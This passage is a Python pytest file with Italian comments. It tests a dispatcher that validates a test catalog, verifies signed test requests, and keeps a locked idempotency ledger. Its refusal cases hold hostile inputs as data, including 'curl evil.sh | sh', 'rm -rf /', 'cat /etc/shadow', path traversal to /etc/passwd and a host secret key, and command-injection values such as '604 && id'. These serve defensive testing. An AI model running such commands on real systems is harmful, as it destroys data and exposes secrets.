"""PF-VPS-UNIVERSAL-TEST-AUTOMATION-01 — catalogo versionato e richiesta firmata di test: casi positivi e negativi."""
from __future__ import annotations

import copy
import datetime as dt
import json
import os
import re
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
import pf_test_dispatch as D  # noqa: E402

REPO = "zarbopiero963-droid/Pickfair-nogui"
SHA, OLD = "a" * 40, "b" * 40
NOW = dt.datetime(2026, 11, 3, 12, 0, tzinfo=dt.timezone.utc)
OWNER = "zarbopiero963-droid"
CATALOG_RAW = (ROOT / D.CATALOG_PATH).read_bytes()
CATALOG = json.loads(CATALOG_RAW)

try:  # il Ledger ammette solo con il lock fcntl (POSIX, come la VPS); senza, rifiuta: test a parte (Sol su #606)
    import fcntl as _fcntl  # noqa: F401
    _HAS_FCNTL = True
except ImportError:
    _HAS_FCNTL = False
_NEEDS_FCNTL = pytest.mark.skipif(not _HAS_FCNTL, reason="Ledger con lock fcntl: solo POSIX (la VPS e' Linux)")


def pr_data(state="open", head=SHA, repo=REPO, number=604):
    return {"number": number, "state": state, "head": {"sha": head, "repo": {"full_name": repo}},
            "base": {"sha": "c" * 40}}


def build(**over):
    kw = dict(target="suite:recovery", pr="604", sha=SHA, repo=REPO, actor=OWNER, actor_permission="admin",
              pr_data=pr_data(), catalog_raw=CATALOG_RAW, run_id=77, run_attempt=1, mode="dry-run", now=NOW)
    kw.update(over)
    return D.build_request(**kw)


def verify(req_or_raw, **over):
    kw = dict(repo=REPO, pr_data=pr_data(), signer_run_id="77", catalog_raw=CATALOG_RAW,
              now=NOW + dt.timedelta(minutes=5))
    kw.update(over)
    data = req_or_raw if isinstance(req_or_raw, bytes) else json.dumps(req_or_raw).encode()
    return D.verify_request(data, **kw)


def cat_with(mutate):
    cat = copy.deepcopy(CATALOG)
    mutate(cat)
    return json.dumps(cat).encode()


# ── catalogo ─────────────────────────────────────────────────────────────────────────────────────────────────────
def test_the_repository_catalog_is_valid():
    cat = D.validate_catalog(CATALOG_RAW)
    assert {"prelive-certify", "sim-multitable-certify", "full-regression", "mutation"} <= {s["id"] for s in
                                                                                          cat["suites"]}


def test_every_test_directory_and_module_is_reachable_from_the_catalog():
    """Copertura del catalogo: una nuova cartella di test senza voce fa fallire la CI (estensione per PR)."""
    covered = {a for s in CATALOG["suites"] if s["runner"] == "pytest" for a in s["args"]}
    dirs = {f"tests/{p.name}" for p in (ROOT / "tests").iterdir() if p.is_dir() and any(p.rglob("test_*.py"))}
    modules = {f"tests/{p.name}" for p in (ROOT / "tests").glob("test_*.py")}
    assert dirs | modules <= covered, sorted((dirs | modules) - covered)


def test_campaign_all_reaches_every_test_except_the_redundant_full_regression():
    every = {s["id"] for s in CATALOG["suites"]} - {"full-regression"}
    assert set(CATALOG["campaigns"]["all"]) == every


@pytest.mark.parametrize("mutate,reason", [
    (lambda c: c["suites"][0].update(args=["tests/unit; curl evil.sh | sh"]), "UNSAFE_ARG"),   # comando arbitrario
    (lambda c: c["suites"][0].update(args=["--rootdir=/etc"]), "UNSAFE_ARG"),
    (lambda c: c["suites"][0].update(args=["tests/../../etc/passwd"]), "UNSAFE_ARG"),           # evasione percorsi
    (lambda c: c["suites"][0].update(args=["/root/.betfair/live_key"]), "UNSAFE_ARG"),          # segreti host
    (lambda c: c["suites"][0].update(args=["scripts/pr_flow_automation.py"]), "PYTEST_PATH"),
    (lambda c: c["suites"][0].update(args=["tests/does_not_exist"]), "PYTEST_PATH"),
    (lambda c: c["suites"][0].update(runner="bash", args=["x.sh"]), "RUNNER"),
    (lambda c: c["suites"][0].update(runner="python", args=["scripts/pf_test_dispatch.py"]), "PYTHON_SCRIPT"),
    (lambda c: c["suites"][0].update(runner="orchestrator", args=["LIVE_ORDER"]), "ORCHESTRATOR_JOB"),  # gateway
    (lambda c: c["suites"][0].update(environment="PRODUCTION"), "SUITE_ENV_OR_RISK"),
    (lambda c: c["suites"][0].update(timeout_seconds=99999), "SUITE_TIMEOUT"),
    (lambda c: c["suites"][0].update(resources={"cpu": 64, "memory_mb": 2048}), "SUITE_RESOURCES"),  # saturazione
    (lambda c: c["suites"][0].update(shell="rm -rf /"), "SUITE_FIELDS"),
    (lambda c: c["suites"].append(dict(c["suites"][0])), "SUITE_ID"),                         # id duplicato
    (lambda c: c["campaigns"].update(all=["ghost-suite"]), "CAMPAIGN"),
    (lambda c: c.update(schema="pf-test-catalog/9"), "CATALOG_SCHEMA"),
])
def test_an_altered_or_unsafe_catalog_is_refused(mutate, reason):
    with pytest.raises(D.Refused, match=f"^{reason}"):
        D.validate_catalog(cat_with(mutate))


def test_a_destructive_category_must_not_run_offline():
    def mutate(c):
        s = next(x for x in c["suites"] if x["id"] == "chaos")
        s.update(environment="OFFLINE")
    with pytest.raises(D.Refused, match="^DESTRUCTIVE_NOT_ISOLATED"):
        D.validate_catalog(cat_with(mutate))


# ── richiesta: positivi ─────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("target,suites", [("suite:recovery", ["recovery"]),
                                           ("suite:prelive-certify", ["prelive-certify"]),
                                           ("campaign:all", sorted(CATALOG["campaigns"]["all"]))])
def test_a_trusted_request_for_the_current_head_is_built_and_verified(target, suites):
    req = build(target=target)
    assert set(req) == D.REQUEST_FIELDS and req["suites"] == suites and req["mode"] == "dry-run"
    assert req["catalog_sha256"] == D.catalog_digest(CATALOG_RAW)
    assert verify(req) == req


# ── richiesta: negativi lato GitHub ─────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("over,reason", [
    (dict(actor="someone-else"), "REQUESTER_NOT_TRUSTED"),                    # richiesta non autorizzata
    (dict(actor_permission="read"), "REQUESTER_PERMISSION"),
    (dict(sha=OLD), "STALE_SHA"),                                              # SHA non corrispondente
    (dict(sha="A" * 40), "MALFORMED_SHA"),
    (dict(pr_data=pr_data(repo="evil/fork")), "FORK_PR"),                     # codice non fidato
    (dict(pr_data=pr_data(state="closed")), "PR_NOT_OPEN"),
    (dict(target="suite:not-registered"), "TARGET_NOT_IN_CATALOG"),           # test non registrato
    (dict(target="suite:recovery; rm -rf /"), "TARGET_NOT_IN_CATALOG"),
    (dict(target="tests/unit"), "TARGET_NOT_IN_CATALOG"),
    (dict(target="campaign:nope"), "TARGET_NOT_IN_CATALOG"),
    (dict(mode="live"), "MODE_NOT_ALLOWED"),
    (dict(pr="604 && id"), "MALFORMED_PR"),
    (dict(catalog_raw=b"{"), "CATALOG_MALFORMED"),
])
def test_untrusted_or_unregistered_requests_are_refused_on_the_github_side(over, reason):
    with pytest.raises(D.Refused, match=f"^{reason}$"):
        build(**over)


# ── richiesta: negativi lato VPS (dopo la firma) ────────────────────────────────────────────────────────────────
def _tampered(**fields):
    req = build()
    req.update(fields)
    return req


@pytest.mark.parametrize("req,over,reason", [
    (_tampered(command="cat /etc/shadow"), {}, "SCHEMA_MISMATCH"),            # campi liberi
    (_tampered(suites=["recovery", "prelive-certify"]), {}, "SUITES_MISMATCH"),
    (_tampered(target="suite:chaos", suites=["chaos"]), {}, "KEY_MISMATCH"),  # target cambiato dopo la firma
    (_tampered(mode="execute"), {}, "MODE_NOT_ALLOWED"),
    (_tampered(repo="evil/repo"), {}, "WRONG_REPO"),
    (_tampered(requested_by="mallory"), {}, "REQUESTER_NOT_TRUSTED"),
    (_tampered(pr=True), {}, "MALFORMED_PR"),
    (build(), dict(signer_run_id="78"), "RUN_MISMATCH"),                       # artefatto di un altro run
    (build(), dict(catalog_raw=cat_with(lambda c: c.update(version=2))), "CATALOG_MISMATCH"),  # catalogo cambiato
    (build(), dict(pr_data=pr_data(head=OLD)), "STALE_SHA"),
    (build(), dict(pr_data=pr_data(state="closed")), "PR_NOT_OPEN"),
    (build(), dict(pr_data=pr_data(repo="evil/fork")), "FORK_PR"),
    (build(), dict(pr_data=pr_data(number=605)), "WRONG_PR"),
    (build(), dict(now=NOW + dt.timedelta(hours=25)), "EXPIRED"),             # replay tardivo
    (build(), dict(now=NOW - dt.timedelta(hours=1)), "EXPIRED"),
])
def test_tampered_replayed_or_stale_requests_are_refused_on_the_vps_side(req, over, reason):
    with pytest.raises(D.Refused, match=f"^{reason}$"):
        verify(req, **over)


@pytest.mark.parametrize("data", [b"\xff", b"not json", b"[]", b"{}"])
def test_malformed_requests_are_refused(data):
    with pytest.raises(D.Refused):
        verify(data)


@_NEEDS_FCNTL
# ── idempotenza, persistenza, crash ─────────────────────────────────────────────────────────────────────────────
def test_a_repeated_request_is_refused_even_after_a_restart(tmp_path):
    path = tmp_path / "vps" / "ledger.json"
    D.Ledger(path).admit(build())
    with pytest.raises(D.Refused, match="^DUPLICATE_REQUEST$"):
        D.Ledger(path).admit(dict(build(), run_id=99))                        # nuovo processo, nuovo run, stesso test
    D.Ledger(path).admit(build(target="suite:chaos"))
    assert len(json.loads(path.read_text())["admitted"]) == 2


@_NEEDS_FCNTL
@pytest.mark.parametrize("content", ["{broken", "[]", '{"admitted": []}'])
def test_an_unreadable_ledger_refuses_instead_of_starting_empty(tmp_path, content):
    path = tmp_path / "ledger.json"
    path.write_text(content)
    with pytest.raises(D.Refused, match="^LEDGER_UNREADABLE$"):
        D.Ledger(path).admit(build())
    assert path.read_text() == content


@_NEEDS_FCNTL
def test_a_crash_during_the_write_leaves_the_previous_ledger_intact(tmp_path, monkeypatch):
    path = tmp_path / "ledger.json"
    D.Ledger(path).admit(build())
    before = path.read_text()
    monkeypatch.setattr(D.os, "replace", lambda *a: (_ for _ in ()).throw(OSError("disk full")))
    with pytest.raises(OSError):
        D.Ledger(path).admit(build(target="suite:chaos"))
    assert path.read_text() == before and not list(tmp_path.glob(".ledger-*"))


# ── stati ───────────────────────────────────────────────────────────────────────────────────────────────────────
CAT_SHA = D.catalog_digest(CATALOG_RAW)


def _cr(i, name="pf-test/recovery", sha=SHA, slug="pickfair-dedicated", status="completed", conclusion="success",
        title="OK", catalog=CAT_SHA):
    return {"id": i, "name": name, "head_sha": sha, "app": {"slug": slug}, "status": status,
            "conclusion": conclusion, "output": {"title": title}, "external_id": f"{catalog}:{'k' * 64}"}


@pytest.mark.parametrize("runs,state", [
    ([], "NOT_REQUESTED"),
    ([_cr(1, slug="evil-app")], "NOT_REQUESTED"),                              # evidenza falsa di un'altra app
    ([_cr(1, sha=OLD)], "NOT_REQUESTED"),
    ([_cr(1, status="queued", conclusion=None)], "QUEUED"),
    ([_cr(1, status="in_progress", conclusion=None)], "RUNNING"),
    ([_cr(1)], "PASS"),
    ([_cr(1, conclusion="failure")], "FAIL"),
    ([_cr(1, conclusion="action_required")], "BLOCKED"),
    ([_cr(1, conclusion="timed_out")], "TIMEOUT"),
    ([_cr(1, conclusion="cancelled")], "CANCELLED"),
    ([_cr(1, conclusion="failure", title="INFRA_ERROR: runner lost")], "INFRA_ERROR"),
    ([_cr(1, conclusion="success", title="INFRA_ERROR: recorder down")], "INFRA_ERROR"),  # mai PASS
    ([_cr(1, conclusion="neutral")], "INFRA_ERROR"),
    ([_cr(1, conclusion="stale")], "INFRA_ERROR"),
    ([_cr(2), _cr(3, status="in_progress", conclusion=None)], "RUNNING"),      # un PASS vecchio non maschera un rerun
    ([_cr(5), _cr(4, status="in_progress", conclusion=None)], "RUNNING"),      # run aperto con id piu' basso
    ([_cr(2, conclusion="failure"), _cr(3)], "PASS"),
])
def test_status_maps_only_trusted_check_runs_of_the_exact_head(runs, state):
    assert D.suite_status("recovery", SHA, runs, CAT_SHA)["state"] == state


def test_certifications_keep_their_historical_check_names():
    assert D.check_name("prelive-certify") == "pf-betfair-certification"
    assert D.check_name("sim-multitable-certify") == "pf-sim-multitable-certification"


@pytest.mark.parametrize("states,verdict", [
    (["PASS", "PASS"], "PASS"), (["PASS", "INFRA_ERROR"], "INFRA_ERROR"), (["PASS", "FAIL"], "FAIL"),
    (["PASS", "RUNNING"], "RUNNING"), (["PASS", "NOT_REQUESTED"], "NOT_REQUESTED"), ([], "BLOCKED"),
    (["FAIL", "INFRA_ERROR"], "INFRA_ERROR"),
    (["PASS", "SOMETHING_NEW"], "BLOCKED"),                                     # stato sconosciuto: mai PASS
])
def test_a_campaign_passes_only_if_every_suite_passes(states, verdict):
    assert D.campaign_state(states) == verdict


# ── workflow e CLI ──────────────────────────────────────────────────────────────────────────────────────────────
WF = ROOT / D.REQUEST_WORKFLOW


def test_workflow_is_dispatch_only_from_main_with_minimal_permissions():
    w = yaml.safe_load(WF.read_text())
    on = w.get("on", w.get(True))
    assert list(on) == ["workflow_dispatch"] and set(on["workflow_dispatch"]["inputs"]) == {"target", "pr", "sha"}
    assert w["permissions"] == {"contents": "read", "pull-requests": "read", "id-token": "write",
                                "attestations": "write"}
    job = w["jobs"]["request"]
    assert job["if"] == "github.ref == 'refs/heads/main'" and job["env"]["PF_TEST_DISPATCH_MODE"] == "dry-run"
    assert job["timeout-minutes"] <= 10


def test_workflow_never_interpolates_inputs_into_shell_and_holds_no_secrets():
    w = yaml.safe_load(WF.read_text())
    steps = w["jobs"]["request"]["steps"]
    for step in steps:
        assert "${{" not in step.get("run", ""), step.get("name")
        assert "ref" not in (step.get("with") or {})
    assert "secrets." not in WF.read_text()
    assert [s.get("uses", "").split("@")[0] for s in steps if "uses" in s] == [
        "actions/checkout", "actions/attest-build-provenance", "actions/upload-artifact"]


def _env(monkeypatch, **over):
    base = {"GITHUB_REPOSITORY": REPO, "GITHUB_ACTOR": OWNER, "PF_REQ_PR": "604", "PF_REQ_TARGET": "suite:recovery",
            "PF_REQ_SHA": SHA, "PF_TEST_DISPATCH_MODE": "dry-run", "GITHUB_RUN_ID": "77", "GITHUB_RUN_ATTEMPT": "1"}
    base.update(over)
    for k, v in base.items():
        monkeypatch.setenv(k, v)


def test_cli_build_refuses_malformed_input_before_any_api_call(monkeypatch, tmp_path, capsys):
    calls = []
    monkeypatch.setattr(D, "_gh", lambda p: calls.append(p) or {})
    _env(monkeypatch, PF_REQ_PR="604/../../x")
    assert D.main(["build", "--output", str(tmp_path / "r.json")]) == 1
    assert calls == [] and json.loads(capsys.readouterr().out)["refused"] == "MALFORMED_INPUT"
    assert not (tmp_path / "r.json").exists()


def test_cli_build_writes_a_verifiable_request(monkeypatch, tmp_path, capsys):
    answers = {f"repos/{REPO}/pulls/604": pr_data(),
               f"repos/{REPO}/collaborators/{OWNER}/permission": {"permission": "admin"}}
    monkeypatch.setattr(D, "_gh", lambda p: answers[p])
    _env(monkeypatch, PF_REQ_TARGET="campaign:all")
    out = tmp_path / "r.json"
    assert D.main(["build", "--output", str(out)]) == 0
    req = json.loads(out.read_text())
    created = dt.datetime.strptime(req["created_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=dt.timezone.utc)
    assert verify(out.read_bytes(), now=created)["suites"] == sorted(CATALOG["campaigns"]["all"])
    assert re.fullmatch(r"[0-9a-f]{64}", json.loads(capsys.readouterr().out)["idempotency_key"])


def test_cli_status_reports_the_campaign_verdict(monkeypatch, capsys):
    runs = [_cr(1, name="pf-test/recovery")]
    monkeypatch.setattr(D, "_gh_pages", lambda p: [{"check_runs": runs}])
    assert D.main(["status", "--repo", REPO, "--target", "suite:recovery", "--sha", SHA]) == 0
    assert json.loads(capsys.readouterr().out)["state"] == "PASS"


# ── copertura dei comportamenti ─────────────────────────────────────────────────────────────────────────────────
def test_behaviour_coverage_is_honest_about_the_inventory():
    cov = json.loads((ROOT / "tests/catalog/behaviour_coverage.json").read_text())
    assert cov["schema"] == "pf-behaviour-coverage/1"
    ids = {s["id"] for s in CATALOG["suites"]}
    for b in cov["behaviours"]:
        assert b["status"] in ("COVERED", "PARTIAL", "NOT_COVERED", "NOT_APPLICABLE") and b["reason"]
        if b["status"] in ("COVERED", "PARTIAL"):
            assert b["suites"] and set(b["suites"]) <= ids
    if not cov["behaviours"]:
        assert cov["inventory"]["status"] == "NOT_IMPORTED"                    # mai "coperto" per assenza di voci


# ── corsia development (PF-UNIVERSAL-TEST-AUTONOMY-365-01): test NUOVI scritti nella PR ─────────────────────────
NEW_TEST = "tests/fi99/test_new_scenario.py"


def dev(**over):
    kw = dict(target=f"dev:{NEW_TEST},tests/fi99", path_exists_at_sha=lambda p: p.startswith("tests/fi99"))
    kw.update(over)
    return build(**kw)


def test_a_brand_new_test_not_in_the_catalog_can_be_requested_on_the_development_lane():
    req = dev()
    assert req["lane"] == "development" and req["suites"] == [] and req["dev_paths"] == [NEW_TEST, "tests/fi99"]
    assert verify(req) == req
    assert D.DEV_SANDBOX["network"] == "none" and D.DEV_SANDBOX["secrets"] == "none"
    assert D.DEV_SANDBOX["certification"] is False


@_NEEDS_FCNTL
def test_a_failed_development_test_can_be_repeated_but_the_same_run_never_twice(tmp_path):
    ledger = D.Ledger(tmp_path / "ledger.json")
    first, again = dev(run_id=77), dev(run_id=78)
    assert first["idempotency_key"] != again["idempotency_key"]                # nuovo dispatch = nuova esecuzione
    ledger.admit(first)
    ledger.admit(again)
    with pytest.raises(D.Refused, match="^DUPLICATE_REQUEST$"):
        ledger.admit(first)                                                    # replay dello stesso run


def test_certification_stays_one_execution_per_sha_regardless_of_the_run():
    assert build(run_id=77)["idempotency_key"] == build(run_id=78)["idempotency_key"]


@pytest.mark.parametrize("target,reason", [
    ("dev:", "TARGET_NOT_IN_CATALOG"),
    ("dev:scripts/pf_test_dispatch.py", "DEV_PATH_UNSAFE"),                    # solo tests/
    ("dev:tests/../scripts/x.py", "DEV_PATH_UNSAFE"),                          # evasione
    ("dev:/etc/passwd", "DEV_PATH_UNSAFE"),
    ("dev:tests/x.py;curl evil|sh", "DEV_PATH_UNSAFE"),                        # comandi arbitrari
    ("dev:tests/x.py --pdb", "DEV_PATH_UNSAFE"),
    ("dev:-p evil_plugin", "DEV_PATH_UNSAFE"),                                 # plugin/flag di pytest
    ("dev:tests/conftest.txt", "DEV_PATH_UNSAFE"),
    ("dev:tests//x.py", "DEV_PATH_UNSAFE"),
    ("dev:tests/a.py,tests/a.py", "DEV_PATHS"),
    ("dev:" + ",".join(f"tests/t{i}.py" for i in range(21)), "DEV_PATHS"),
])
def test_development_paths_are_only_test_files_or_directories(target, reason):
    with pytest.raises(D.Refused, match=f"^{reason}$"):
        dev(target=target, path_exists_at_sha=lambda p: True)


def test_development_paths_must_exist_in_the_pr_code_at_the_sha():
    with pytest.raises(D.Refused, match="^DEV_PATH_MISSING$"):
        dev(path_exists_at_sha=lambda p: False)
    with pytest.raises(D.Refused, match="^DEV_PATH_MISSING$"):
        dev(path_exists_at_sha=None)                                           # nessuna verifica => mai eseguito


@pytest.mark.parametrize("fields,reason", [
    (dict(lane="certification"), "LANE_MISMATCH"),                             # un dev non si traveste da ufficiale
    (dict(suites=["prelive-certify"]), "SUITES_MISMATCH"),
    (dict(dev_paths=["tests/other.py"]), "SUITES_MISMATCH"),
    (dict(run_id=99), "RUN_MISMATCH"),
])
def test_a_development_request_cannot_be_turned_into_a_certification(fields, reason):
    req = dict(dev(), **fields)
    with pytest.raises(D.Refused, match=f"^{reason}$"):
        verify(req)


def test_a_certification_request_cannot_smuggle_development_paths():
    with pytest.raises(D.Refused, match="^SUITES_MISMATCH$"):
        verify(dict(build(), dev_paths=["tests/fi99/test_new_scenario.py"]))


def test_development_results_never_count_as_certification():
    key = dev()["idempotency_key"]
    runs = [_cr(1, name=D.dev_check_name(key)), _cr(2, name="pf-test/recovery", conclusion="failure")]
    st = D.dev_status(key, SHA, runs)
    assert st["state"] == "PASS" and st["certification"] is False
    assert D.suite_status("recovery", SHA, runs, CAT_SHA)["state"] == "FAIL"           # il PASS dev non copre la suite
    assert D.dev_check_name(key).startswith("pf-dev-test/")
    assert not any(D.check_name(s["id"]).startswith("pf-dev-test/") for s in CATALOG["suites"])
    assert D.dev_status(key, SHA, [_cr(1, name=D.dev_check_name(key), slug="evil-app")])["state"] == "NOT_REQUESTED"


def test_cli_dev_build_checks_paths_on_the_pr_code(monkeypatch, tmp_path, capsys):
    answers = {f"repos/{REPO}/pulls/604": pr_data(),
               f"repos/{REPO}/collaborators/{OWNER}/permission": {"permission": "admin"},
               f"repos/{REPO}/contents/{NEW_TEST}?ref={SHA}": {"type": "file"}}

    def gh(p):
        if p not in answers:
            raise D.Refused("GITHUB_API_UNAVAILABLE")                          # 404 => assente
        return answers[p]
    monkeypatch.setattr(D, "_gh", gh)
    _env(monkeypatch, PF_REQ_TARGET=f"dev:{NEW_TEST}")
    assert D.main(["build", "--output", str(tmp_path / "r.json")]) == 0
    assert json.loads((tmp_path / "r.json").read_text())["lane"] == "development"
    capsys.readouterr()
    _env(monkeypatch, PF_REQ_TARGET="dev:tests/missing_test.py")
    assert D.main(["build", "--output", str(tmp_path / "r2.json")]) == 1
    assert json.loads(capsys.readouterr().out)["refused"] == "DEV_PATH_MISSING"


# ── Codex P2 su #606: un SHA ha piu' di 100 check run, si leggono TUTTE le pagine ──────────────────────────────
def test_status_reads_every_page_of_check_runs(monkeypatch, capsys):
    page1 = [_cr(i, name=f"ci/job-{i}") for i in range(1, 101)]
    page2 = [_cr(500, name="pf-test/recovery")]
    seen = []
    monkeypatch.setattr(D, "_gh_pages", lambda p: seen.append(p) or [{"check_runs": page1}, {"check_runs": page2}])
    assert D.main(["status", "--repo", REPO, "--target", "suite:recovery", "--sha", SHA]) == 0
    assert json.loads(capsys.readouterr().out)["state"] == "PASS"
    assert seen == [f"repos/{REPO}/commits/{SHA}/check-runs?filter=all&per_page=100"]


def test_dev_status_reads_every_page_of_check_runs(monkeypatch, capsys):
    key = dev()["idempotency_key"]
    pages = [{"check_runs": [_cr(i, name=f"ci/{i}") for i in range(100)]},
             {"check_runs": [_cr(900, name=D.dev_check_name(key))]}]
    monkeypatch.setattr(D, "_gh_pages", lambda p: pages)
    assert D.main(["status", "--repo", REPO, "--target", "suite:recovery", "--sha", SHA, "--dev-key", key]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["state"] == "PASS" and out["certification"] is False


@pytest.mark.parametrize("pages", [None, [{"check_runs": "x"}], [{"nope": []}], "garbage"])
def test_malformed_check_run_pages_are_refused_not_read_as_empty(monkeypatch, capsys, pages):
    monkeypatch.setattr(D, "_gh_pages", lambda p: pages)
    assert D.main(["status", "--repo", REPO, "--target", "suite:recovery", "--sha", SHA]) == 1
    assert json.loads(capsys.readouterr().out)["refused"] == "GITHUB_API_MALFORMED"


def test_pages_are_requested_explicitly_until_a_short_page(monkeypatch):
    calls = []
    full = {"check_runs": [_cr(i) for i in range(100)]}
    short = {"check_runs": [_cr(1000)]}
    monkeypatch.setattr(D, "_gh", lambda p: calls.append(p) or (full if p.endswith("page=1") else short))
    runs = D.all_check_runs(REPO, SHA)
    assert len(runs) == 101
    assert calls == [f"repos/{REPO}/commits/{SHA}/check-runs?filter=all&per_page=100&page=1",
                     f"repos/{REPO}/commits/{SHA}/check-runs?filter=all&per_page=100&page=2"]


def test_too_many_pages_is_unverifiable_never_partial(monkeypatch):
    full = {"check_runs": [_cr(i) for i in range(100)]}
    monkeypatch.setattr(D, "_gh", lambda p: full)
    with pytest.raises(D.Refused, match="^GITHUB_API_TOO_MANY_PAGES$"):
        D.all_check_runs(REPO, SHA)


# ── Sol + Grok su #606: Ledger.admit atomico fra processi ──────────────────────────────────────────────────────
def _admit_in_child(args):
    path, key = args
    try:
        D.Ledger(Path(path)).admit({"idempotency_key": key, "lane": "certification", "target": "suite:unit",
                                    "pr": 1, "head_sha": SHA, "run_id": 1})
        return "ADMITTED"
    except D.Refused as exc:
        return str(exc)


#: i test concorrenti usano processi reali con ``fork`` e il lock ``fcntl``: Linux/POSIX, come la VPS (Sol su #606)
_POSIX_ONLY = pytest.mark.skipif(not hasattr(__import__("os"), "fork"),
                                 reason="processi fork e lock fcntl: solo POSIX (la VPS e' Linux)")


@_POSIX_ONLY
def test_concurrent_admissions_of_distinct_requests_are_all_kept(tmp_path):
    import multiprocessing as mp
    path = tmp_path / "ledger.json"
    keys = [f"{i:064x}" for i in range(24)]
    with mp.get_context("fork").Pool(8) as pool:
        out = pool.map(_admit_in_child, [(str(path), k) for k in keys])
    assert out == ["ADMITTED"] * len(keys)
    assert set(json.loads(path.read_text())["admitted"]) == set(keys)          # nessuna ammissione persa


@_POSIX_ONLY
def test_concurrent_admissions_of_the_same_request_admit_exactly_one(tmp_path):
    import multiprocessing as mp
    path = tmp_path / "ledger.json"
    with mp.get_context("fork").Pool(8) as pool:
        out = pool.map(_admit_in_child, [(str(path), "f" * 64)] * 16)
    assert out.count("ADMITTED") == 1 and out.count("DUPLICATE_REQUEST") == 15


def test_admit_fails_closed_when_the_lock_cannot_be_taken(tmp_path, monkeypatch):
    monkeypatch.setattr(D, "_lock_file", lambda fh: (_ for _ in ()).throw(OSError("no locks")))
    with pytest.raises(D.Refused, match="^LEDGER_LOCK_UNAVAILABLE$"):
        D.Ledger(tmp_path / "ledger.json").admit(build())
    assert not (tmp_path / "ledger.json").exists()


# ── Sol su #606: tutti i check run, non solo gli ultimi per nome ──────────────────────────────────────────────
def test_check_runs_are_read_with_filter_all(monkeypatch):
    calls = []
    monkeypatch.setattr(D, "_gh", lambda p: calls.append(p) or {"check_runs": []})
    D.all_check_runs(REPO, SHA)
    assert calls and all("filter=all" in c for c in calls)


# ── Grok su #606: chaos e crash-restart solo in ambiente distruttivo isolato, a qualunque rischio ─────────────
@pytest.mark.parametrize("category", ["chaos", "crash-restart"])
@pytest.mark.parametrize("risk", ["LOW", "MEDIUM", "HIGH"])
@pytest.mark.parametrize("env", ["OFFLINE", "SIM", "REPLAY_RECORDED"])
def test_destructive_categories_require_the_ephemeral_sandbox_at_any_risk(category, risk, env):
    def mutate(c):
        c["suites"][0].update(category=category, risk=risk, environment=env)
    with pytest.raises(D.Refused, match="^DESTRUCTIVE_NOT_ISOLATED"):
        D.validate_catalog(cat_with(mutate))


def test_without_fcntl_the_ledger_refuses_instead_of_admitting_unlocked(tmp_path, monkeypatch):
    """Piattaforma senza ``fcntl`` (Windows): nessuna ammissione senza lock, fail-closed."""
    import builtins
    real_import = builtins.__import__

    def no_fcntl(name, *a, **k):
        if name == "fcntl":
            raise ImportError("no fcntl")
        return real_import(name, *a, **k)
    monkeypatch.setattr(builtins, "__import__", no_fcntl)
    with pytest.raises(D.Refused, match="^LEDGER_LOCK_UNAVAILABLE$"):
        D.Ledger(tmp_path / "ledger.json").admit(build())
    assert not (tmp_path / "ledger.json").exists()


# ── Sol su #606 (review completa ada4076…006440c): una suite aggregata non deve eseguire fuori dalla sandbox i
# percorsi che il catalogo isola ───────────────────────────────────────────────────────────────────────────────
def _suite(c, sid):
    return next(s for s in c["suites"] if s["id"] == sid)


def test_the_real_full_regression_runs_in_the_ephemeral_sandbox():
    assert _suite(CATALOG, "full-regression")["environment"] in D.DESTRUCTIVE_ENVS


@pytest.mark.parametrize("env", ["OFFLINE", "SIM", "REPLAY_RECORDED"])
def test_an_aggregate_suite_that_includes_isolated_paths_must_itself_be_isolated(env):
    def mutate(c):
        _suite(c, "full-regression").update(environment=env, risk="LOW")
    with pytest.raises(D.Refused, match="^AGGREGATE_INCLUDES_ISOLATED:full-regression$"):
        D.validate_catalog(cat_with(mutate))


@pytest.mark.parametrize("path", ["tests/chaos", "tests/chaos/test_auto_throttle_chaos.py", "tests/recovery"])
def test_a_non_isolated_suite_cannot_run_part_of_an_isolated_path(path):
    def mutate(c):
        _suite(c, "acceptance").update(args=[path])
    with pytest.raises(D.Refused, match="^AGGREGATE_INCLUDES_ISOLATED:acceptance$"):
        D.validate_catalog(cat_with(mutate))


def test_non_isolated_suites_outside_isolated_paths_stay_valid():
    cat = D.validate_catalog(CATALOG_RAW)
    assert _suite(cat, "acceptance")["environment"] == "SIM"


# Sol su #606 (d27d4762, VALID_BLOCKERS): `tests/.` superava _check_args e sfuggiva al confronto testuale di _covers,
# quindi una suite OFFLINE/SIM avrebbe raccolto chaos, recovery e stress fuori dalla sandbox. Ogni percorso deve essere
# gia' canonico: nessun segmento `.`, vuoto o `..`, nessuna barra finale.
@pytest.mark.parametrize("path", ["tests/.", "tests/./chaos", "tests/chaos/.", "tests/chaos/", "tests//chaos",
                                  "tests/./recovery/", "tests/./chaos/test_auto_throttle_chaos.py"])
def test_non_canonical_catalog_paths_are_refused_before_the_isolation_check(path):
    def mutate(c):
        _suite(c, "acceptance").update(args=[path])
    with pytest.raises(D.Refused, match="^UNSAFE_ARG:acceptance$"):
        D.validate_catalog(cat_with(mutate))


@pytest.mark.parametrize("target", ["dev:tests/.", "dev:tests/./chaos", "dev:tests/chaos/", "dev:tests/./x.py"])
def test_non_canonical_development_paths_are_refused(target):
    with pytest.raises(D.Refused, match="^DEV_PATH_UNSAFE$"):
        dev(target=target, path_exists_at_sha=lambda p: True)


# Sol su #606 (8fadc8c8, VALID_BLOCKERS): dopo os.replace va sincronizzata anche la DIRECTORY, altrimenti un crash
# dell'host puo' perdere la rinomina: l'ammissione gia' confermata sparisce e la stessa richiesta viene riammessa.
@_NEEDS_FCNTL
def test_admission_fsyncs_the_ledger_directory_after_the_rename(tmp_path, monkeypatch):
    path = tmp_path / "ledger" / "admitted.json"
    events = []
    real_fsync, real_replace = os.fsync, os.replace

    def fsync(fd):
        events.append(("fsync", os.fstat(fd).st_mode & 0o170000 == 0o040000))
        return real_fsync(fd)

    def replace(a, b):
        events.append(("replace", None))
        return real_replace(a, b)
    monkeypatch.setattr(D.os, "fsync", fsync)
    monkeypatch.setattr(D.os, "replace", replace)
    D.Ledger(path).admit(build())
    after = events[events.index(("replace", None)) + 1:]
    assert ("fsync", True) in after, events                      # la directory e' sincronizzata DOPO la rinomina


@_NEEDS_FCNTL
def test_a_failed_directory_fsync_is_never_reported_as_admitted(tmp_path, monkeypatch):
    path = tmp_path / "ledger" / "admitted.json"
